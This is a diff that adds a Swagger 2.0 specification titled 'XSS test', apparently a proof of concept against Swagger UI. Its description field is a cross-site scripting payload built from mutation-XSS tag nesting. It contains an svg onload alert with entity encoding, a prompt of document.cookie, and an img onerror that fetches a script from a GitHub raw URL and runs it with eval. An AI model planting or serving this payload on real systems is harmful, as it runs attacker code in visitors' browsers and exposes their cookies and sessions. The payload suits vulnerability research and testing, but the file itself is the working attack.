@@ -1,0 +1,7 @@
+swagger: '2.0'
+info:
+  title: XSS test
+  description: <math><mtext><h1>"></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
+</textarea><ScRiPt>prompt(/hack the planet/)</ScRiPt//
+ %22%3E%3C/script%3E%3Csvg%20onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)%3E%3C/textarea%3E%3CScRiPt%3Eprompt(document.cookie)%3C/ScRiPt//<a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  version: production
